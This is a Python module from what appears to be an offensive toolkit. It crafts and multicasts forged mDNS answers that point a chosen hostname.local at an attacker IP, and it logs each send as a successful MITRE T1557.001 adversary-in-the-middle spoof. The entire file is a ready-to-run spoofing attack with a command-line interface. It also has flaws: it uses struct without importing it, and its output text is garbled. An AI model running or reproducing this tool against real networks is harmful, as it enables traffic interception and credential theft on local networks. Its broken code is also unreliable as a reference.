# modules/exploits/mdns_spoofer.py

import socket
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1557.001"  # Adversary-in-the-Middle: LLMNR/NBT-NS Spoofing

def log_mdns_spoof(name, spoofed_ip):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "service": "mDNS",
        "spoofed_name": name,
        "spoofed_ip": spoofed_ip,
        "ttp": MITRE_TTP,
        "success": True
    }
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, 'r') as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, 'w') as f:
        json.dump(data, f, indent=2)

def send_mdns_spoof(name, spoof_ip):
    group = "224.0.0.251"
    port = 5353
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ttl = struct.pack('b', 1)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)

    mdns_packet = (
        b'\x00\x00\x84\x00\x00\x01\x00\x01\x00\x00\x00\x00' +
        bytes([len(name)]) + name.encode() + b'\x05local\x00' +
        b'\x00\x01\x00\x01' +
        b'\xc0\x0c' +
        b'\x00\x01\x00\x01\x00\x00\x00\x78\x00\x04' +
        socket.inet_aton(spoof_ip)
    )

    sock.sendto(mdns_packet, (group, port))
    log_mdns_spoof(name, spoof_ip)
    print(f"[âœ“] Sent mDNS spoof: {name}.local -> {spoof_ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="mDNS Spoofing Utility")
    parser.add_argument("--name", required=True, help="Hostname to spoof (without .local)")
    parser.add_argument("--ip", required=True, help="Spoofed IP to return")
    args = parser.parse_args()
    send_mdns_spoof(args.name, args.ip)
